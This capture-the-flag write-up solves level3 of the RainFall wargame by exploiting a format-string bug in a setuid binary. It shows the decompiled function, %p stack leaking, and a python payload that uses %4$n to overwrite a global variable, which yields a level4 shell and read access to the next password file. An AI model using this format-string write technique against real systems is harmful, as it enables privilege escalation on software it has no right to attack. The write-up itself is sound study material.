```
level3@RainFall:~$  ll
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

Ok so let's go to cutter directly
```
void v(void)
{
    int size;
    FILE *nitems;
    FILE *stream;
    char *format;
    
    fgets(&format, 0x200, _stdin);
    printf(&format);
    if (_m == 0x40) {
        fwrite("Wait what?!\n", 1, 0xc, _stdout);
        system("/bin/sh");
    }
    return;
}
```
So where does this _m comes from  ?
It is a global variable
so we see that the printf is not secured, we can litterally put any kind of "%" like %p %f %d..
let's see what we can see 

```
level3@RainFall:~$ ./level3
AAAA %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```
Ok so here we can see the 0x41414141, which is our first argument the AAAA, so we can enter 0x40 in it so that the if works
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*(60) + "%4$n"' | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
```
Ok so, let's explain the command, 
first of all how did we get the adress of the global variable ?
By reading the ASM ode, why the "A"*60 ? so that in total we write 64 characters, what is the %4$n, it write the number of character written in total (64 == 0x40)
and writes it in the fourth parameter
but it still didn't work
why ?
Same as last level
```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A"*(60) + "%4$n"'; cat) | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cd ../level4
ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
cat .pass
<hidden>
```
GGs

